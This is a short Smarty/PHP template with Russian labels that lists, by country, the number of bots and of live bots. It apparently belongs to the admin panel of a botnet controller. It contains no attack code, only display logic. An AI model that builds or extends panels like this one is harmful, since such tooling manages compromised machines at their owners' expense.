{php}include_once('modules/admins/country_code.php');{/php}
<form action="#" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
<table cellspacing=1 cellpadding=0 style="width:100%" class="t">
	<tr class="t4">
		<td style="vertical-align:middle;text-align:center; width: 400px;" class="bg3">Страна</td>
		<td style="vertical-align:middle;text-align:center;" class="bg3">Количество ботов</td>
		<td style="vertical-align:middle;text-align:center;" class="bg3">Живых ботов</td>
  </tr>
{foreach from=$bots item=bot name=bots}
{if $smarty.foreach.bots.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bg{$bg}" onMouseMove="this.id = 'bg4'" onMouseOut="this.id = 'bg{$bg}'" style="cursor:pointer;">
		<th title="{$bot->country}">{$country_code[$bot->country]}</th>
		<th>{$bot->count}</th>
		<th>{$bot->live_bot}</th>
  </tr>
{/foreach}
</table>
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Информация по странам - {$admin->link}';
</script>